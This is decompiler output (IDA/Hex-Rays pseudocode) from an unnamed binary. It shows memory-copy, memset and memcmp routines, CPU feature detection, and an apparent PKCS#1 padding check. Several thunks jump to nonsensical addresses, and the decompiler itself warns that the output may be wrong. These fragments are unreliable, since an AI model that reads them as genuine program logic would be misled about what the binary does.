// Function: sub_7308 at 0x7308
__int64 __fastcall sub_7308(__int64 a1, __int64 a2, __int64 a3, int a4, __int64 a5, int a6)
{
  int v6; // edi
  int v7; // esi
  char *v10; // rax
  __int64 *v11; // r10
  __int64 v12; // r11
  __int128 v13; // xmm1
  __int128 v14; // xmm0
  __int128 v15; // xmm1
  __int128 v16; // xmm0
  __int128 v17; // xmm1
  __int128 v18; // xmm0
  __int128 v19; // xmm1
  char v21; // [rsp+34h] [rbp-414h] BYREF
  _BYTE v22[524]; // [rsp+234h] [rbp-214h] BYREF

  v6 = a5;
  v7 = a3;
  sub_7AF0(a5, a3, 0LL, v22, 509LL);
  v10 = &v21;
  v11 = qword_9DB0;
  v12 = 4LL;
  do
  {
    v13 = *((_OWORD *)v11 + 1);
    *(_OWORD *)v10 = *(_OWORD *)v11;
    v14 = *((_OWORD *)v11 + 2);
    *((_OWORD *)v10 + 1) = v13;
    v15 = *((_OWORD *)v11 + 3);
    *((_OWORD *)v10 + 2) = v14;
    v16 = *((_OWORD *)v11 + 4);
    *((_OWORD *)v10 + 3) = v15;
    v17 = *((_OWORD *)v11 + 5);
    *((_OWORD *)v10 + 4) = v16;
    v18 = *((_OWORD *)v11 + 6);
    *((_OWORD *)v10 + 5) = v17;
    v19 = *((_OWORD *)v11 + 7);
    v11 += 16;
    *((_OWORD *)v10 + 6) = v18;
    v10 += 128;
    *((_OWORD *)v10 - 1) = v19;
    --v12;
  }
  while ( v12 );
  *(_WORD *)&v22[509] = -30392;
  v22[511] = 92;
  return sub_7400(v6, v7, v7, a4, v6, a6);
}


// Function: sub_7400 at 0x7400
__int64 __fastcall sub_7400(
        _DWORD a1,
        _DWORD a2,
        _DWORD *a3,
        __int64 a4,
        __int64 a5,
        unsigned int a6,
        __int64 a7,
        __int64 a8,
        __int64 a9,
        __int64 a10,
        _DWORD *a11)
{
  unsigned int v13; // ebx
  __int64 result; // rax
  unsigned int v15; // r9d
  char *v16; // rax
  __int64 v17; // rax
  unsigned int v18; // r9d
  int v19; // [rsp+0h] [rbp-268h]
  int v20; // [rsp+8h] [rbp-260h]
  __int64 v21; // [rsp+10h] [rbp-258h]
  int v22; // [rsp+18h] [rbp-250h]
  unsigned int v23[4]; // [rsp+30h] [rbp-238h] BYREF
  _BYTE v24[2]; // [rsp+40h] [rbp-228h] BYREF
  char v25; // [rsp+42h] [rbp-226h] BYREF

  v13 = (unsigned int)(*a11 + 7) >> 3;
  if ( a6 > v13 )
    return 4098LL;
  result = sub_71CC((__int64)a3, a4, v23, (__int64)v24, a5, a6, v19, v20, v21, v22, a11);
  if ( (_DWORD)result )
    return result;
  if ( v23[0] != v13 )
    return 4098LL;
  if ( v24[0] || v24[1] != 1 )
    return 4097LL;
  v15 = 2;
  if ( v13 - 1 > 2 )
  {
    v16 = &v25;
    do
    {
      if ( *v16 != -1 )
        break;
      ++v15;
      ++v16;
    }
    while ( v15 < v13 - 1 );
  }
  v17 = v15;
  v18 = v15 + 1;
  if ( v24[v17] )
    return 4097LL;
  *a3 = v13 - v18;
  if ( v13 - v18 + 11 > v13 )
    return 4097LL;
  sub_7830(a3, a4, &v24[v18], a4, v13 - v18);
  return 0LL;
}


// Function: sub_74E4 at 0x74E4
// attributes: thunk
void __fastcall sub_74E4()
{
  JUMPOUT(0xC341D000D541DLL);
}


// Function: sub_74EA at 0x74EA
// attributes: thunk
void __fastcall sub_74EA()
{
  JUMPOUT(0xC015E017F019721DLL);
}


// Function: sub_74F0 at 0x74F0
// attributes: thunk
void __fastcall sub_74F0()
{
  JUMPOUT(0x600160200040802LL);
}


// Function: sub_74F6 at 0x74F6
// attributes: thunk
void __fastcall sub_74F6()
{
  JUMPOUT(0x4080230049208LL);
}


// Function: sub_74FC at 0x74FC
// attributes: thunk
void sub_74FC(void)
{
  JUMPOUT(0x3004520806001602LL);
}


// Function: sub_7502 at 0x7502
// attributes: thunk
void __fastcall sub_7502()
{
  JUMPOUT(0x8340F0009640FLL);
}


// Function: sub_7520 at 0x7520
__int64 __fastcall sub_7520(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rcx
  __int64 result; // rax

  if ( a4 == 0xF98B48DA8B4820ECLL )
  {
    v4 = __ROL8__(0xF98B48DA8B4820ECLL, 16);
    if ( !(_WORD)v4 )
      return result;
    a4 = __ROR8__(v4, 16);
  }
  return sub_7540(a1, a2, a3, a4);
}


// Function: sub_7540 at 0x7540
__int64 __fastcall sub_7540(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rdx
  __int64 v5; // rcx

  MEMORY[0x7008E00AF00C5213](a1, a2, a4, 247LL, 0xF98B48DA8B4820ECLL, 0xD38B4800000017E8LL);
  __debugbreak();
  return sub_756D(a1, a2, v4, v5);
}


// Function: sub_756D at 0x756D
// attributes: thunk
void __fastcall sub_756D()
{
  JUMPOUT(0x10741206001602LL);
}


// Function: sub_7574 at 0x7574
__int64 __fastcall sub_7574(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)
{
  sub_7594(a1, a2, a6, a3, *(_QWORD *)(a6 + 56));
  return 1LL;
}


// Function: sub_7594 at 0x7594
__int64 __fastcall sub_7594(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 result; // rax
  int v4; // edx

  result = *(_QWORD *)(a3 + 8);
  v4 = *(unsigned __int8 *)(*(unsigned int *)(*(_QWORD *)(a3 + 16) + 8LL) + result + 3);
  if ( (v4 & 0xF) != 0 )
    return v4 & 0xFFFFFFF0;
  return result;
}


// Function: sub_7600 at 0x7600
// attributes: thunk
void __fastcall sub_7600()
{
  JUMPOUT(0x60A0200004204LL);
}


// Function: sub_7610 at 0x7610
// attributes: thunk
void __fastcall sub_7610()
{
  JUMPOUT(0xC3418000D5418LL);
}


// Function: sub_7616 at 0x7616
// attributes: thunk
void __fastcall sub_7616()
{
  JUMPOUT(0xD541C000E641CLL);
}


// Function: sub_7630 at 0x7630
__int64 __fastcall sub_7630(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 *a4, unsigned __int64 a5)
{
  __int64 v5; // rdx
  bool v6; // cf
  unsigned __int64 v8; // r9
  unsigned __int64 v9; // rax
  unsigned __int64 v10; // r9

  v5 = a3 - (_QWORD)a4;
  if ( a5 < 8 )
    goto LABEL_6;
  for ( ; ((unsigned __int8)a4 & 7) != 0; --a5 )
  {
    v6 = *(_BYTE *)a4 < *((_BYTE *)a4 + v5);
    if ( *(_BYTE *)a4 != *((_BYTE *)a4 + v5) )
      return -v6 - ((unsigned int)v6 - 1);
    a4 = (unsigned __int64 *)((char *)a4 + 1);
  }
  if ( !(a5 >> 3) )
  {
LABEL_6:
    if ( !a5 )
      return 0LL;
    while ( 1 )
    {
      v6 = *(_BYTE *)a4 < *((_BYTE *)a4 + v5);
      if ( *(_BYTE *)a4 != *((_BYTE *)a4 + v5) )
        break;
      a4 = (unsigned __int64 *)((char *)a4 + 1);
      if ( !--a5 )
        return 0LL;
    }
    return -v6 - ((unsigned int)v6 - 1);
  }
  v8 = a5 >> 5;
  if ( a5 >> 5 )
  {
    while ( 1 )
    {
      v9 = *a4;
      if ( *a4 != *(unsigned __int64 *)((char *)a4 + v5) )
        break;
      v9 = a4[1];
      if ( v9 != *(unsigned __int64 *)((char *)a4 + v5 + 8) )
        goto LABEL_24;
      v9 = a4[2];
      if ( v9 != *(unsigned __int64 *)((char *)a4 + v5 + 16) )
        goto LABEL_23;
      v9 = a4[3];
      if ( v9 != *(unsigned __int64 *)((char *)a4 + v5 + 24) )
      {
        ++a4;
LABEL_23:
        ++a4;
LABEL_24:
        ++a4;
        break;
      }
      a4 += 4;
      if ( !--v8 )
      {
        a5 &= 0x1Fu;
        goto LABEL_18;
      }
    }
  }
  else
  {
LABEL_18:
    v10 = a5 >> 3;
    if ( !(a5 >> 3) )
      goto LABEL_6;
    while ( 1 )
    {
      v9 = *a4;
      if ( *a4 != *(unsigned __int64 *)((char *)a4 + v5) )
        break;
      ++a4;
      if ( !--v10 )
      {
        a5 &= 7u;
        goto LABEL_6;
      }
    }
  }
  v6 = _byteswap_uint64(v9) < _byteswap_uint64(*(unsigned __int64 *)((char *)a4 + v5));
  return -v6 - ((unsigned int)v6 - 1);
}


// Function: sub_76F7 at 0x76F7
// attributes: thunk
void __fastcall sub_76F7()
{
  JUMPOUT(0x7006320A0006340ALL);
}


// Function: sub_76FD at 0x76FD
// attributes: thunk
void __fastcall sub_76FD()
{
  JUMPOUT(0x6001603000A1502LL);
}


// Function: sub_7703 at 0x7703
// attributes: thunk
void __fastcall sub_7703()
{
  JUMPOUT(0x96415000A7415LL);
}


// Function: sub_770C at 0x770C
// write access to const memory has been detected, the output may be wrong!
__int64 sub_770C()
{
  int v5; // r8d
  char v7; // r9
  int v12; // r10d

  _RAX = 0LL;
  __asm { cpuid }
  v5 = _RAX;
  _RAX = 1LL;
  v7 = 0;
  __asm { cpuid }
  v12 = _RCX;
  _RAX = 7LL;
  if ( v5 >= 7 )
  {
    v7 = 0;
    __asm { cpuid }
    LOBYTE(_RAX) = 2;
    if ( (_RBX & 0x200) != 0 )
      v7 = 2;
  }
  if ( (v12 & 0x100000) != 0 && (v12 & 0x8000000) != 0 && (v12 & 0x10000000) != 0 )
  {
    __asm { xgetbv }
    if ( (_RAX & 6) == 6 )
      v7 |= 4u;
  }
  byte_9FF0 = v7 | 1;
  return 0LL;
}


// Function: nullsub_2 at 0x77B0
void nullsub_2()
{
  ;
}


// Function: sub_77D0 at 0x77D0
__int64 __fastcall sub_77D0()
{
  __int64 (*v0)(void); // rax

  return v0();
}


// Function: sub_77F0 at 0x77F0
// attributes: thunk
void sub_77F0()
{
  JUMPOUT(0x90012100983421LL);
}


// Function: sub_7830 at 0x7830
__m128 *__fastcall sub_7830(__int64 a1, __int64 a2, char *a3, char *a4, unsigned __int64 a5)
{
  __m128 *result; // rax
  __int64 v6; // r11
  __int64 v7; // rdx
  __int128 v8; // xmm1
  bool v9; // cf
  signed __int64 v10; // rdx
  char v11; // r11
  char *v12; // rcx
  char v13; // r11
  char *v14; // r11
  signed __int64 v15; // rdx
  __m128 v16; // xmm0
  unsigned __int64 v17; // rcx
  unsigned __int64 v18; // rcx
  __m128 v19; // xmm1
  unsigned __int64 v20; // r8
  unsigned __int64 v21; // r9
  __int128 v22; // xmm1
  __int128 v23; // xmm2
  __int128 v24; // xmm3
  __m128 v25; // xmm4
  unsigned __int64 j; // r9
  unsigned __int64 v27; // r8
  unsigned __int64 v28; // r9
  __m128 v29; // xmm1
  __m128 v30; // xmm2
  __m128 v31; // xmm3
  __m128 v32; // xmm4
  char *v33; // rcx
  __int128 v34; // xmm0
  unsigned __int64 v35; // rcx
  unsigned __int64 v36; // r8
  _OWORD *v37; // r11
  __int128 v38; // xmm1
  unsigned __int64 v39; // r9
  __int128 v40; // xmm1
  __int128 v41; // xmm2
  __int128 v42; // xmm3
  __int128 v43; // xmm4
  unsigned __int64 i; // r9
  unsigned __int64 v45; // r8

  result = (__m128 *)a4;
  if ( a5 < 8 )
  {
    if ( a5 )
    {
      v9 = a3 < a4;
      v10 = a3 - a4;
      if ( v9 )
      {
        v12 = &a4[a5];
        do
        {
          v13 = v12[v10 - 1];
          --v12;
          --a5;
          *v12 = v13;
        }
        while ( a5 );
      }
      else
      {
        do
        {
          v11 = a4[v10];
          ++a4;
          --a5;
          *(a4 - 1) = v11;
        }
        while ( a5 );
      }
    }
  }
  else if ( a5 > 0x10 )
  {
    if ( a5 > 0x20 )
    {
      v14 = &a3[a5];
      v9 = a3 < a4;
      v15 = a3 - a4;
      if ( v9 && v14 > a4 )
      {
        v33 = &a4[a5];
        v34 = *(_OWORD *)&v33[v15 - 16];
        v35 = (unsigned __int64)(v33 - 16);
        v36 = a5 - 16;
        if ( (v35 & 0xF) != 0 )
        {
          v37 = (_OWORD *)v35;
          v35 &= 0xFFFFFFFFFFFFFFF0LL;
          v38 = *(_OWORD *)(v35 + v15);
          *v37 = v34;
          v34 = v38;
          v36 = v35 - (_QWORD)result;
        }
        v39 = v36 >> 6;
        if ( v36 >> 6 )
        {
          v36 &= 0x3Fu;
          do
          {
            v40 = *(_OWORD *)(v35 + v15 - 16);
            v41 = *(_OWORD *)(v35 + v15 - 32);
            v42 = *(_OWORD *)(v35 + v15 - 48);
            v43 = *(_OWORD *)(v35 + v15 - 64);
            *(_OWORD *)v35 = v34;
            v35 -= 64LL;
            --v39;
            *(_OWORD *)(v35 + 48) = v40;
            *(_OWORD *)(v35 + 32) = v41;
            *(_OWORD *)(v35 + 16) = v42;
            v34 = v43;
          }
          while ( v39 );
        }
        for ( i = v36 >> 4; i; --i )
        {
          *(_OWORD *)v35 = v34;
          v34 = *(_OWORD *)(v35 + v15 - 16);
          v35 -= 16LL;
        }
        v45 = v36 & 0xF;
        if ( v45 )
          *(_OWORD *)(v35 - v45) = *(_OWORD *)(v35 - v45 + v15);
        *(_OWORD *)v35 = v34;
      }
      else
      {
        v16 = *(__m128 *)&a4[v15];
        v17 = (unsigned __int64)(a4 + 16);
        if ( (v17 & 0xF) != 0 )
        {
          v18 = v17 & 0xFFFFFFFFFFFFFFF0LL;
          v19 = *(__m128 *)(v18 + v15);
          *result = v16;
          v16 = v19;
          v17 = v18 + 16;
        }
        v20 = (unsigned __int64)result + a5 - v17;
        v21 = v20 >> 6;
        if ( v20 >> 6 )
        {
          if ( v21 > 0x1000 )
          {
            v28 = v20 >> 6;
            v20 &= 0x3Fu;
            _mm_prefetch((const char *)(v17 + v15 + 64), 0);
            do
            {
              v29 = *(__m128 *)(v17 + v15);
              v30 = *(__m128 *)(v17 + v15 + 16);
              v31 = *(__m128 *)(v17 + v15 + 32);
              v32 = *(__m128 *)(v17 + v15 + 48);
              _mm_stream_ps((float *)(v17 - 16), v16);
              v17 += 64LL;
              _mm_prefetch((const char *)(v17 + v15 + 64), 0);
              --v28;
              _mm_stream_ps((float *)(v17 - 64), v29);
              _mm_stream_ps((float *)(v17 - 48), v30);
              _mm_stream_ps((float *)(v17 - 32), v31);
              v16 = v32;
            }
            while ( v28 );
            _mm_sfence();
          }
          else
          {
            v20 &= 0x3Fu;
            do
            {
              v22 = *(_OWORD *)(v17 + v15);
              v23 = *(_OWORD *)(v17 + v15 + 16);
              v24 = *(_OWORD *)(v17 + v15 + 32);
              v25 = *(__m128 *)(v17 + v15 + 48);
              *(__m128 *)(v17 - 16) = v16;
              v17 += 64LL;
              --v21;
              *(_OWORD *)(v17 - 64) = v22;
              *(_OWORD *)(v17 - 48) = v23;
              *(_OWORD *)(v17 - 32) = v24;
              v16 = v25;
            }
            while ( v21 );
          }
        }
        for ( j = v20 >> 4; j; --j )
        {
          *(__m128 *)(v17 - 16) = v16;
          v16 = *(__m128 *)(v17 + v15);
          v17 += 16LL;
        }
        v27 = v20 & 0xF;
        if ( v27 )
          *(_OWORD *)(v17 + v27 - 16) = *(_OWORD *)(v17 + v27 - 16 + v15);
        *(__m128 *)(v17 - 16) = v16;
      }
    }
    else
    {
      v8 = *(_OWORD *)&a3[a5 - 16];
      *(_OWORD *)a4 = *(_OWORD *)a3;
      *(_OWORD *)&a4[a5 - 16] = v8;
    }
  }
  else
  {
    v6 = *(_QWORD *)a3;
    v7 = *(_QWORD *)&a3[a5 - 8];
    *(_QWORD *)a4 = v6;
    *(_QWORD *)&a4[a5 - 8] = v7;
  }
  return result;
}


// Function: sub_7AF0 at 0x7AF0
_OWORD *__fastcall sub_7AF0(__int64 a1, __int64 a2, unsigned __int8 a3, _OWORD *a4, unsigned __int64 a5)
{
  _OWORD *result; // rax
  __int64 v6; // rdx
  __m128 v7; // xmm0
  char *v8; // r8
  __m128 *v9; // rdx
  _OWORD *v10; // r9
  unsigned __int64 v11; // r8
  __m128 *v12; // r9
  unsigned __int64 v13; // r8
  _DWORD *v14; // r9
  unsigned __int64 v15; // r8

  result = a4;
  v6 = 0x101010101010101LL * a3;
  v7 = _mm_movelh_ps((__m128)(unsigned __int64)v6, (__m128)(unsigned __int64)v6);
  if ( a5 >= 0x40 )
  {
    *a4 = v7;
    v8 = (char *)a4 + a5;
    a4 = (_OWORD *)((unsigned __int64)(a4 + 1) & 0xFFFFFFFFFFFFFFF0LL);
    a5 = v8 - (char *)a4;
    if ( a5 >= 0x40 )
    {
      v9 = (__m128 *)((char *)a4 + a5 - 16);
      v10 = (_OWORD *)(((unsigned __int64)a4 + a5 - 48) & 0xFFFFFFFFFFFFFFF0LL);
      v11 = a5 >> 6;
      do
      {
        *a4 = v7;
        a4[1] = v7;
        a4 += 4;
        --v11;
        *(a4 - 2) = v7;
        *(a4 - 1) = v7;
      }
      while ( v11 );
      *v10 = v7;
      v10[1] = v7;
      v10[2] = v7;
      *v9 = v7;
      return result;
    }
LABEL_7:
    v12 = (__m128 *)((char *)a4 + a5 - 16);
    *a4 = v7;
    v13 = (a5 & 0x20) >> 1;
    *v12 = v7;
    *(__m128 *)((char *)a4 + v13) = v7;
    *(__m128 *)((char *)v12 - v13) = v7;
    return result;
  }
  if ( a5 >= 0x10 )
    goto LABEL_7;
  if ( a5 < 4 )
  {
    if ( a5 )
    {
      *(_BYTE *)a4 = v6;
      if ( a5 != 1 )
        *(_WORD *)((char *)a4 + a5 - 2) = v6;
    }
  }
  else
  {
    v14 = (_DWORD *)((char *)a4 + a5 - 4);
    *(_DWORD *)a4 = v6;
    v15 = (a5 & 8) >> 1;
    *v14 = v6;
    *(_DWORD *)((char *)a4 + v15) = v6;
    *(_DWORD *)((char *)v14 - v15) = v6;
  }
  return result;
}


// Function: sub_7CB0 at 0x7CB0
void __spoils<rdx,rcx,r8,r9,r10,r11,xmm0,xmm4,xmm5> sub_7CB0()
{
  sub_770C();
}


// Function: nullsub_3 at 0x85B1
void nullsub_3()
{
  ;
}


// Function: nullsub_4 at 0x85B9
void nullsub_4()
{
  ;
}


// Function: nullsub_5 at 0x9FCA
void nullsub_5()
{
  __asm { iret }
}


// Function: sub_9FD0 at 0x9FD0
// positive sp value has been detected, the output may be wrong!
void sub_9FD0()
{
  ;
}


// Function: nullsub_6 at 0xA0A9
void nullsub_6()
{
  ;
}


// Function: nullsub_7 at 0xA46A
__int64 nullsub_7()
{
  _BYTE retaddr[16]; // [rsp+0h] [rbp+0h]

  return MK_FP(*(_WORD *)retaddr, *(_QWORD *)retaddr)();
}


// Function: nullsub_8 at 0xAA40
void nullsub_8()
{
  ;
}


